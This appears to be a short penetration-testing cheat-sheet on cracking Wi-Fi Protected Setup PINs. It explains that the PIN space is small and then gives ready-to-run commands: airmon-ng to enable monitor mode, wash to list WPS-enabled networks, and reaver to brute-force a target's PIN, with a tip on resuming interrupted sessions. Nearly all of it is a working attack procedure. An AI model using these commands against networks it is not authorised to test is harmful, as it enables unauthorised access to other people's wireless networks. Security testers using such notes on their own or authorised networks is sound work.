# WPS

> WPS can be attacked using a brute-force on the PIN (has only about 11,000 valid combinations).

1. Set Wireless adapted to monitor mode.

```bash
airmon-ng start wlan0
```

2. Run a tool to identicate candidate WPS enabled networks (note the BSSID and channel).

```bash
wash -i wlan0mon
```

3. Use reaver to crack the PIN (care with lockdowns).

```bash
reaver -i wlan0mon -b $BSSID -c $CHANNELNUM -vv
```

Reaver is smart enough to remember where it was, and will ask you if you want to resume an interrupted session. So the cracking can be done in a number of sessions.
